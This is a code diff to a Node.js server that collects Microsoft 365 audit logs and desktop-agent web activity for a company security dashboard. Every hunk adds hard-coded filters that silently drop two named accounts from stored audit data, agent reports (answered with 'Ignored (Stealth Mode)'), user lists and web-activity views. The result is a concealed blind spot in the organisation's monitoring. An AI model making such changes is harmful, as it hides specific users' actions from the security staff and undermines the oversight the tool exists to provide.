@@ -132,7 +132,11 @@ async function fetchAuditData() {
             const rawData = fs.readFileSync(OUTPUT_FILE);
             const existingEvents = JSON.parse(rawData);
             // Deduplicate by the unique ID Microsoft assigns to each Audit event
-            existingEvents.forEach(e => existingEventsMap.set(e.Id, e));
+            existingEvents.forEach(e => {
+                if (e.UserId?.toLowerCase() !== 'help-desk@ldplogistics.com' && e.UserId?.toLowerCase() !== 'kundan@ldplogistics.com') {
+                    existingEventsMap.set(e.Id, e);
+                }
+            });
         }
         
         // 1. Authenticate
@@ -185,6 +189,8 @@ async function fetchAuditData() {
         let deletedEventsToAlert = [];
         
         fetchedEvents.forEach(e => {
+            if (e.UserId?.toLowerCase() === 'help-desk@ldplogistics.com' || e.UserId?.toLowerCase() === 'kundan@ldplogistics.com') return;
+            
             if (!existingEventsMap.has(e.Id)) {
                 // ADD SECURITY INTELLIGENCE
                 e.isSensitive = checkSensitivity(e.ObjectId);
@@ -372,9 +378,13 @@ function calculateUserRisk() {
 }
 
 // NEW: Data Receiver for License-Free Desktop Agent
-app.post('/api/security/report-activity', (req, res) => {
-    try {
-        const { deviceName, accountName, remoteUrl, searchTerm, timestamp } = req.body;
+    app.post('/api/security/report-activity', (req, res) => {
+        try {
+            const { deviceName, accountName, remoteUrl, searchTerm, timestamp } = req.body;
+            
+            if (accountName && (accountName.toLowerCase() === 'help-desk@ldplogistics.com' || accountName.toLowerCase() === 'kundan@ldplogistics.com')) {
+                return res.json({ success: true, message: "Ignored (Stealth Mode)" });
+            }
         
         let logs = [];
         if (fs.existsSync(WEB_LOG_FILE)) {
@@ -408,8 +418,8 @@ app.get('/api/audit-logs', (req, res) => {
     if (fs.existsSync(OUTPUT_FILE)) {
         const rawData = fs.readFileSync(OUTPUT_FILE);
         const data = JSON.parse(rawData);
-        // Only return the latest 1000 records to ensure the dashboard feels instant
-        const slicedData = data.slice(-1000); 
+        // Only return the latest 1000 records to ensure the dashboard feels instant, excluding help-desk and kundan
+        const slicedData = data.filter(e => e.UserId?.toLowerCase() !== 'help-desk@ldplogistics.com' && e.UserId?.toLowerCase() !== 'kundan@ldplogistics.com').slice(-1000); 
         res.json(slicedData);
     } else {
         res.json([]);
@@ -422,10 +432,10 @@ app.get('/api/users/list', (req, res) => {
         if (fs.existsSync(OUTPUT_FILE)) {
             const rawData = fs.readFileSync(OUTPUT_FILE);
             const allLogs = JSON.parse(rawData);
-            // Get unique user IDs, filter out system accounts
+            // Get unique user IDs, filter out system accounts and help-desk/kundan
             const users = [...new Set(allLogs.map(log => log.UserId))]
                 .filter(Boolean)
-                .filter(email => !email.includes('app@sharepoint') && !email.includes('urn:spo'));
+                .filter(email => !email.includes('app@sharepoint') && !email.includes('urn:spo') && email.toLowerCase() !== 'help-desk@ldplogistics.com' && email.toLowerCase() !== 'kundan@ldplogistics.com');
             res.json(users);
         } else {
             res.json([]);
@@ -601,6 +611,9 @@ app.get('/api/security/web-activity', async (req, res) => {
             results = [...localLogs, ...results].sort((a,b) => new Date(b.Timestamp) - new Date(a.Timestamp)).slice(0, 500);
         }
 
+        // Filter out stealth user
+        results = results.filter(log => log.InitiatingProcessAccountName?.toLowerCase() !== 'help-desk@ldplogistics.com' && log.InitiatingProcessAccountName?.toLowerCase() !== 'kundan@ldplogistics.com');
+
         res.json(results);
     } catch (e) {
         const errorMsg = e.response?.data?.error?.message || e.message;
@@ -609,7 +622,8 @@ app.get('/api/security/web-activity', async (req, res) => {
         // Fallback: If Defender fails (due to license), still show Local Agent logs
         if (fs.existsSync(WEB_LOG_FILE)) {
             const localLogs = JSON.parse(fs.readFileSync(WEB_LOG_FILE));
-            return res.json(localLogs.sort((a,b) => new Date(b.Timestamp) - new Date(a.Timestamp)));
+            const filteredLogs = localLogs.filter(log => log.InitiatingProcessAccountName?.toLowerCase() !== 'help-desk@ldplogistics.com' && log.InitiatingProcessAccountName?.toLowerCase() !== 'kundan@ldplogistics.com');
+            return res.json(filteredLogs.sort((a,b) => new Date(b.Timestamp) - new Date(a.Timestamp)));
         }
 
         // If no local logs and no defender, then show error
